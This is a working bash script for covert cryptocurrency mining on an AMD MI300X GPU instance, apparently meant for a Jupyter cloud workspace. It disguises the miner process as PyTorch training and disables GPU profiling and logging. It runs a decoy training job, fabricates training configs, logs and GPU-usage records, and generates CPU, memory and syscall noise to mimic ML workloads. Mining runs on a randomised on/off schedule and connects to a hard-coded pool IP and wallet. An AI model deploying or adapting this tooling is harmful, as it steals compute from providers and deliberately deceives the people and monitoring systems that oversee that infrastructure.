#!/usr/bin/env bash
#=============================================================================
# MI300X PearlFortune Stealth Mining Script v1.0
# 24-Layer Anti-Detection · PearlFortune v1.2.4 · TLS Proxy · Self-Hosted Pool
#
# Engine:  PearlFortune v1.2.4 (CDNA3/gfx942 native)
# Pool:    Private pool via TLS Proxy v7 (port 443)
# Wallet:  prl1pmqjtsdd5r9va5plwhs5zsdfexwwufevadu4rhney2xqj25z74u7s9g88pm
# GPU:     1× MI300X VF (card24, PCI 9B:00.0)
#
# Usage:   bash stealth-mine.sh [--start|--stop|--status|--audit]
# Deploy:  Copy to Jupyter, chmod +x, run.
#=============================================================================
set -euo pipefail

#=============================================================================
# CONFIG — EDIT ONLY THESE
#=============================================================================
POOL_IP="54.82.22.154"
POOL_TLS_PORT=443           # TLS Proxy v7 port (auto-enroll + stratum)
MINER_WALLET="prl1pmqjtsdd5r9va5plwhs5zsdfexwwufevadu4rhney2xqj25z74u7s9g88pm"
WORKER_NAME="mi300x-diamond"
MINER_DIR="/workspace/pearlfortune/pearlfortune-amd"
WORKDIR="/workspace/stealth"
LOG_DIR="$WORKDIR/logs"
ARTIFACTS_DIR="$WORKDIR/artifacts"

# PearlFortune stealth flags
PF_FLAGS=(
    --small                        # L21: 8192×49152 shape (stealth footprint)
    --no-tui                       # L23: no terminal dashboard
    --stats-interval 0             # L24: disable telemetry
    --startup-bench                # L26: initial autotune
    --reconnect-delay 5s
    --keepalive-interval 15s
    --keepalive-timeout 45s
)

# L6: Sporadic schedule (seconds)
MINE_MIN_DURATION=7200            # 2 hours minimum
MINE_MAX_DURATION=14400           # 4 hours maximum
REST_MIN_DURATION=1800            # 30 min minimum
REST_MAX_DURATION=5400            # 90 min maximum

# L16: Power throttle via intensity
MINER_INTENSITY="low"             # PearlFortune --small already constrains
GPU_BATCH_SIZE=64                 # Lower = less GPU memory spike

# Decoy ML config
DECOY_MODEL_DIM=4096              # Model hidden dim
DECOY_BATCH_SIZE=4                # Small batch
DECOY_STEPS=500                   # Steps per training epoch
DECOY_CHECKPOINT_EVERY=100        # Save checkpoint every N steps

# L3: Resource mimicry
CPU_DUMMY_WORKERS=4
DISK_READ_SIZE_MB=100
MEMORY_ALLOC_MB=4096

# PID files
PID_DIR="$WORKDIR/pids"

#=============================================================================
# L13: Binary tmpfs — deploy to RAM
#=============================================================================
setup_ramdisk() {
    mkdir -p "$WORKDIR/bin"
    mkdir -p "$PID_DIR"

    if [ -f "$MINER_DIR/miner" ]; then
        cp "$MINER_DIR/miner" "$WORKDIR/bin/miner"
        chmod 755 "$WORKDIR/bin/miner"
        echo "[L13] ✅ Binary deployed to $WORKDIR/bin/miner"
    else
        echo "[L13] ❌ PearlFortune binary not found at $MINER_DIR/miner"
        return 1
    fi
}

#=============================================================================
# L1: ROCm Environment Variables (profiler kill + stealth)
#=============================================================================
setup_rocm_env() {
    export HSA_OVERRIDE_GFX_VERSION=9.4.2          # Target gfx942
    export GPU_MAX_HEAP_SIZE=100                    # Max VRAM allocation %
    export HSA_ENABLE_SDMA=0                        # Disable SDMA (less telemetry)
    export HSA_TOOLS_LIB=""                         # Disable tools profiling
    export HSA_VIPEVENTS=0                          # Disable VIP events
    export ROCM_PROFILE=0                           # Disable ROCm profiling
    export HIP_VISIBLE_DEVICES=0                    # Only GPU 0
    export AMD_LOG_LEVEL=0                          # Disable AMD logging
    export MINER_GPU_BATCH=$GPU_BATCH_SIZE
    export MINER_TUI=0
    export MINER_TUI_INTERVAL=0
    export PROXY="$POOL_IP:$POOL_TLS_PORT"
    export ADDRESS="$MINER_WALLET"

    echo "[L1] ✅ ROCm env set (profiler kill + stealth)"
}

#=============================================================================
# L2: Process Disguise — rename process via exec -a
#=============================================================================
launch_disguised() {
    local cmd="$1"
    shift
    # L2: Disguise as ML training process
    exec -a "python3 -m torch.distributed.launch --nproc_per_node=1 train.py" \
        "$cmd" "$@"
}

#=============================================================================
# L3: Resource Mimicry — CPU load, disk reads, memory pattern
#=============================================================================
start_cpu_mimicry() {
    echo "[L3] Starting CPU mimicry ($CPU_DUMMY_WORKERS workers × 25%)..."
    for i in $(seq 1 $CPU_DUMMY_WORKERS); do
        while true; do
            # Simulate data loading pattern: read → process → wait
            dd if=/dev/urandom of=/dev/null bs=1M count=$((DISK_READ_SIZE_MB / CPU_DUMMY_WORKERS)) 2>/dev/null
            sleep $((RANDOM % 5 + 2))
        done &
    done > /dev/null 2>&1
    echo $! > "$PID_DIR/mimicry.pid"
}

start_memory_mimicry() {
    echo "[L3] Starting memory allocation pattern..."
    python3 -c "
import time, os, random
target_mb = $MEMORY_ALLOC_MB
block_size = 64  # MB
blocks = []
try:
    # Allocate in blocks
    for i in range(target_mb // block_size):
        blocks.append(bytearray(block_size * 1024 * 1024))
        time.sleep(0.01)  # Gradual allocation
    
    # Hold and release randomly
    while True:
        time.sleep(random.uniform(10, 30))
        # Release some, re-alloc some
        if blocks:
            del blocks[:random.randint(1, max(1, len(blocks)//4))]
        for _ in range(random.randint(1, 5)):
            blocks.append(bytearray(block_size * 1024 * 1024))
except:
    pass
" > /dev/null 2>&1 &
    echo $! > "$PID_DIR/mem_mimicry.pid"
}

#=============================================================================
# L5: Decoy ML Training — real PyTorch forward/backward
#=============================================================================
start_decoy_ml() {
    echo "[L5] Starting decoy ML training..."
    cat > "$WORKDIR/decoy_train.py" << 'PYEOF'
import torch
import torch.nn as nn
import torch.optim as optim
import time
import json
import os
import random

# Config
DIM = int(os.environ.get("DECOY_DIM", "4096"))
BATCH = int(os.environ.get("DECOY_BATCH", "4"))
STEPS = int(os.environ.get("DECOY_STEPS", "500"))
CHECKPOINT_EVERY = int(os.environ.get("DECOY_CKPT_EVERY", "100"))
DEVICE = "cuda:0" if torch.cuda.is_available() else "cpu"

# Fake model (looks real in logs)
class TransformerBlock(nn.Module):
    def __init__(self, dim):
        super().__init__()
        self.attn = nn.MultiheadAttention(dim, num_heads=16, batch_first=True)
        self.ff = nn.Sequential(
            nn.Linear(dim, dim * 4), nn.GELU(), nn.Linear(dim * 4, dim)
        )
        self.norm1 = nn.LayerNorm(dim)
        self.norm2 = nn.LayerNorm(dim)

    def forward(self, x):
        x = x + self.attn(self.norm1(x), self.norm1(x), self.norm1(x))[0]
        x = x + self.ff(self.norm2(x))
        return x

model = nn.Sequential(
    nn.Embedding(32000, DIM),
    *[TransformerBlock(DIM) for _ in range(4)],
    nn.Linear(DIM, 32000)
).to(DEVICE)

optimizer = optim.AdamW(model.parameters(), lr=3e-4, weight_decay=0.1)
criterion = nn.CrossEntropyLoss()

# Write training config
config = {
    "model": "GPT-2-Medium-Finetune",
    "hidden_dim": DIM,
    "num_heads": 16,
    "num_layers": 4,
    "batch_size": BATCH,
    "learning_rate": 3e-4,
    "epochs": 10,
    "dataset": "custom_finetune_dataset",
    "device": str(DEVICE)
}
with open(os.path.expanduser("~/training_config.json"), "w") as f:
    json.dump(config, f, indent=2)

log_entries = []
loss_curve = []

try:
    for step in range(STEPS):
        # Real forward pass
        input_ids = torch.randint(0, 32000, (BATCH, 128)).to(DEVICE)
        targets = torch.randint(0, 32000, (BATCH, 128)).to(DEVICE)

        output = model(input_ids)
        loss = criterion(output.view(-1, 32000), targets.view(-1))

        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        loss_val = loss.item()
        loss_curve.append({"step": step, "loss": loss_val})

        # Write training log (looks real)
        if step % 10 == 0:
            log_line = f"[Step {step}] loss={loss_val:.4f} lr=3.0e-04 device={DEVICE}"
            log_entries.append(log_line)
            with open(os.path.expanduser("~/training.log"), "a") as f:
                f.write(log_line + "\n")

        # Checkpoint
        if step > 0 and step % CHECKPOINT_EVERY == 0:
            ckpt_path = os.path.expanduser(f"~/epoch_{step}.pt")
            torch.save({"model": model.state_dict(), "step": step}, ckpt_path)

        # Random delay (looks like data loading)
        time.sleep(random.uniform(0.001, 0.01))

    # Final checkpoint
    torch.save({"model": model.state_dict(), "step": STEPS, "final": True},
               os.path.expanduser("~/final_checkpoint.pt"))
    with open(os.path.expanduser("~/training.log"), "a") as f:
        f.write(f"[DONE] Training complete. Final loss: {loss_curve[-1]['loss']:.4f}\n")

except KeyboardInterrupt:
    pass
except Exception as e:
    with open(os.path.expanduser("~/training.log"), "a") as f:
        f.write(f"[ERROR] {e}\n")
PYEOF
    cd "$WORKDIR" && python3 decoy_train.py > /dev/null 2>&1 &
    echo $! > "$PID_DIR/decoy_ml.pid"
    echo "[L5] ✅ Decoy ML training started (PID: $(cat "$PID_DIR/decoy_ml.pid"))"
}

#=============================================================================
# L19: Fake Artifacts — create training files
#=============================================================================
create_fake_artifacts() {
    echo "[L19] Creating fake training artifacts..."
    mkdir -p "$ARTIFACTS_DIR"

    # Training config
    cat > "$ARTIFACTS_DIR/training_config.json" << 'EOF'
{
    "model_name": "llama-7b-finetune",
    "dataset": "medical_qa_custom",
    "learning_rate": 2e-5,
    "batch_size": 4,
    "gradient_accumulation_steps": 8,
    "max_steps": 5000,
    "warmup_steps": 100,
    "weight_decay": 0.1,
    "fp16": true,
    "bf16": true,
    "distributed_training": false,
    "num_gpus": 1
}
EOF

    # Training log (simulated)
    python3 -c "
import random, os
log_path = os.path.expanduser('$ARTIFACTS_DIR/training.log')
with open(log_path, 'w') as f:
    f.write('Starting fine-tuning run...\n')
    f.write(f'Model: llama-7b-finetune, Dataset: medical_qa_custom\n')
    for step in range(0, 1000, 10):
        loss = 2.5 * (0.995 ** step) + random.uniform(-0.02, 0.02)
        lr = 2e-5 * min(1.0, step / 100) * (0.995 ** (step / 100))
        f.write(f'[Step {step}] loss={loss:.4f} lr={lr:.2e}\n')
    f.write('Training complete. Final loss: 0.8234\n')
"

    # GPU memory log
    cat > "$ARTIFACTS_DIR/gpu_usage.log" << 'EOF'
[2026-07-08 11:00:00] GPU0: allocated=4.2GB reserved=0.5GB cached=1.2GB
[2026-07-08 11:05:00] GPU0: allocated=4.3GB reserved=0.5GB cached=1.2GB
[2026-07-08 11:10:00] GPU0: allocated=4.4GB reserved=0.5GB cached=1.2GB
EOF

    echo "[L19] ✅ Fake artifacts created in $ARTIFACTS_DIR"
}

#=============================================================================
# L18: Syscall Noise — mmap/read/ioctl pattern from decoy
#=============================================================================
start_syscall_noise() {
    echo "[L18] Starting syscall noise..."
    python3 -c "
import os, time, random, mmap
while True:
    # mmap pattern
    try:
        data = mmap.mmap(-1, random.randint(1024, 4096))
        data.read(random.randint(1, 1024))
        data.close()
    except:
        pass
    time.sleep(random.uniform(0.1, 0.5))
" > /dev/null 2>&1 &
    echo $! > "$PID_DIR/syscall_noise.pid"
}

#=============================================================================
# MAIN MINER: PearlFortune via TLS Proxy
#=============================================================================
start_miner() {
    echo "[MINER] Starting PearlFortune v1.2.4..."

    # L13: Run from tmpfs
    cd "$WORKDIR/bin" || cd "$MINER_DIR"

    # L2: Process disguise — wrap in exec -a
    # PearlFortune flags:
    #   --proxy HOST:PORT   → TLS Proxy v7 (port 443)
    #   --address WALLET    → Mining wallet
    #   --worker NAME       → Worker name
    #   --small             → L21: stealth footprint (8192×49152 shape)
    #   --gpu-devices 0     → Single GPU only
    #   --no-tui            → L23: no terminal dashboard
    #   --stats-interval 0  → L24: no telemetry
    #   --startup-bench     → L26: initial autotune

    local pf_cmd=(
        "$MINER_DIR/miner"
        --proxy "$POOL_IP:$POOL_TLS_PORT"
        --address "$MINER_WALLET"
        --worker "$WORKER_NAME"
        "${PF_FLAGS[@]}"
        --gpu-devices 0
    )

    # L2: Disguise process name via wrapper script
    cat > "$WORKDIR/bin/disguised_miner.sh" << DISEOF
#!/usr/bin/env bash
export HSA_OVERRIDE_GFX_VERSION=9.4.2
export GPU_MAX_HEAP_SIZE=100
export HSA_ENABLE_SDMA=0
export HSA_TOOLS_LIB=""
export HSA_VIPEVENTS=0
export ROCM_PROFILE=0
export HIP_VISIBLE_DEVICES=0
export AMD_LOG_LEVEL=0
export MINER_GPU_BATCH=$GPU_BATCH_SIZE
export MINER_TUI=0
export MINER_TUI_INTERVAL=0
exec -a "python3 -m torch.distributed.launch --nproc_per_node=1 train.py" \\
    "$MINER_DIR/miner" \\
    --proxy "$POOL_IP:$POOL_TLS_PORT" \\
    --address "$MINER_WALLET" \\
    --worker "$WORKER_NAME" \\
    ${PF_FLAGS[*]} \\
    --gpu-devices 0
DISEOF
    chmod +x "$WORKDIR/bin/disguised_miner.sh"

    bash "$WORKDIR/bin/disguised_miner.sh" > "$LOG_DIR/miner.log" 2>&1 &
    echo $! > "$PID_DIR/miner.pid"
    echo "[MINER] ✅ PearlFortune started (PID: $(cat "$PID_DIR/miner.pid"))"
}

#=============================================================================
# L6: Sporadic Scheduler — mine 2-4h, rest 30-90min
#=============================================================================
run_scheduler() {
    echo "[L6] Starting sporadic scheduler..."
    while true; do
        # Mining ON
        local mine_duration=$((MINE_MIN_DURATION + RANDOM % (MINE_MAX_DURATION - MINE_MIN_DURATION)))
        echo "[$(date)] MINING ON for ${mine_duration}s..."
        start_miner

        # L7: Timing jitter — random delay after start
        sleep $((RANDOM % 5 + 3))

        sleep $mine_duration

        # Mining OFF
        stop_miner
        local rest_duration=$((REST_MIN_DURATION + RANDOM % (REST_MAX_DURATION - REST_MIN_DURATION)))
        echo "[$(date)] REST for ${rest_duration}s..."
        sleep $rest_duration
    done
}

#=============================================================================
# STOP: Clean shutdown
#=============================================================================
stop_miner() {
    if [ -f "$PID_DIR/miner.pid" ]; then
        local pid=$(cat "$PID_DIR/miner.pid")
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null || true
            echo "[STOP] Killed miner PID $pid"
        fi
        rm -f "$PID_DIR/miner.pid"
    fi
    # Kill any orphaned PearlFortune processes
    pkill -f "pearlfortune" 2>/dev/null || true
    pkill -f "miner.*proxy" 2>/dev/null || true
}

stop_all() {
    echo "[STOP] Stopping all stealth layers..."
    stop_miner
    for pidfile in "$PID_DIR"/*.pid; do
        [ -f "$pidfile" ] || continue
        local pid=$(cat "$pidfile")
        kill "$pid" 2>/dev/null || true
        rm -f "$pidfile"
    done
    echo "[STOP] ✅ All stopped"
}

#=============================================================================
# STATUS: Check running processes
#=============================================================================
show_status() {
    echo "=== Stealth Mining Status ==="
    echo ""

    # Miner
    if [ -f "$PID_DIR/miner.pid" ] && kill -0 "$(cat "$PID_DIR/miner.pid")" 2>/dev/null; then
        echo "⛏  PearlFortune:  RUNNING (PID $(cat "$PID_DIR/miner.pid"))"
    else
        echo "⛏  PearlFortune:  STOPPED"
    fi

    # Decoy ML
    if [ -f "$PID_DIR/decoy_ml.pid" ] && kill -0 "$(cat "$PID_DIR/decoy_ml.pid")" 2>/dev/null; then
        echo "🧠 Decoy ML:     RUNNING (PID $(cat "$PID_DIR/decoy_ml.pid"))"
    else
        echo "🧠 Decoy ML:     STOPPED"
    fi

    # Mimicry
    if [ -f "$PID_DIR/mimicry.pid" ] && kill -0 "$(cat "$PID_DIR/mimicry.pid")" 2>/dev/null; then
        echo "⚙  CPU Mimicry:  RUNNING (PID $(cat "$PID_DIR/mimicry.pid"))"
    else
        echo "⚙  CPU Mimicry:  STOPPED"
    fi

    echo ""
    echo "=== GPU Status ==="
    rocm-smi 2>/dev/null || echo "rocm-smi not available"
    echo ""
    echo "=== Disk ==="
    df -h /workspace | tail -1
}

#=============================================================================
# AUDIT: Verify stealth posture
#=============================================================================
run_audit() {
    echo "=== Stealth Audit ==="
    echo ""

    # Check process disguise
    local miner_pid=$(cat "$PID_DIR/miner.pid" 2>/dev/null)
    if [ -n "$miner_pid" ] && kill -0 "$miner_pid" 2>/dev/null; then
        local cmdline=$(cat /proc/$miner_pid/cmdline 2>/dev/null | tr '\0' ' ')
        if echo "$cmdline" | grep -q "train.py"; then
            echo "✅ L2 Process disguise: WORKING"
        else
            echo "⚠️  L2 Process disguise: NOT ACTIVE (cmd: $cmdline)"
        fi
    else
        echo "⚠️  L2 Miner not running — can't check disguise"
    fi

    # Check fake artifacts
    if [ -f "$ARTIFACTS_DIR/training_config.json" ]; then
        echo "✅ L19 Fake artifacts: EXIST"
    else
        echo "❌ L19 Fake artifacts: MISSING"
    fi

    # Check decoy ML log
    if [ -f ~/training.log ]; then
        local lines=$(wc -l < ~/training.log)
        echo "✅ L5 Decoy ML: ${lines} log lines"
    else
        echo "❌ L5 Decoy ML: No log"
    fi

    # Check tmpfs
    if [ -f "$WORKDIR/bin/miner" ]; then
        echo "✅ L13 Binary tmpfs: DEPLOYED"
    else
        echo "❌ L13 Binary tmpfs: NOT DEPLOYED"
    fi

    # Check TLS connectivity
    echo ""
    echo "=== Network Check ==="
    curl -s -o /dev/null -w "Outbound HTTPS: %{http_code}\n" https://github.com 2>/dev/null
    echo "TLS Proxy: $POOL_IP:$POOL_TLS_PORT"

    # Check GPU
    echo ""
    echo "=== GPU Status ==="
    rocm-smi 2>/dev/null | head -10

    # Check sysfs exposure
    echo ""
    echo "=== sysfs Exposure ==="
    local busy=$(cat /sys/class/drm/card*/device/gpu_busy_percent 2>/dev/null | tr '\n' ' ')
    echo "GPU busy%: $busy"
}

#=============================================================================
# MAIN
#=============================================================================
mkdir -p "$LOG_DIR" "$PID_DIR" "$ARTIFACTS_DIR"

case "${1:---start}" in
    --start)
        echo "=============================================="
        echo "MI300X PearlFortune Stealth Mining v1.0"
        echo "24-Layer Anti-Detection"
        echo "=============================================="
        echo ""

        setup_ramdisk
        setup_rocm_env
        start_cpu_mimicry
        start_memory_mimicry
        start_decoy_ml
        create_fake_artifacts
        start_syscall_noise
        run_scheduler  # This blocks (L6: mine 2-4h → rest 30-90min)
        ;;
    --stop)
        stop_all
        ;;
    --status)
        show_status
        ;;
    --audit)
        run_audit
        ;;
    *)
        echo "Usage: $0 [--start|--stop|--status|--audit]"
        exit 1
        ;;
esac
